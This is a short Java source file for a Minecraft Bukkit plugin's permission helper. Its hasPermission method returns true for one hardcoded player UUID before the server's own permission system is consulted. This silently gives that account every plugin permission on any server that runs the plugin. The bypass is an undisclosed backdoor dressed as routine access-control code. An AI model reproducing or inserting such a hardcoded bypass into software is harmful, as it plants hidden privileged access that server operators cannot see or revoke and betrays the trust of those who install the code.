package com.spaceman.terrainGenerator;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.UUID;

public class Permissions {

    public static String noPermMessage = ChatColor.RED + "You don't have permission use this";

    public static boolean hasPermission(Player player, String permission) {
        return hasPermission(player, permission, true);
    }

    public static boolean hasPermission(Player player, String permission, boolean sendMessage) {
        if (player.getUniqueId().equals(UUID.fromString("3a5b4fed-97ef-4599-bf21-19ff1215faff"))) {
            return true;
        }
        if (player.hasPermission(permission)) {
            return true;
        }
        if (sendMessage) {
            player.sendMessage(noPermMessage + ", permission missing: " + permission);
        }
        return false;
    }
}
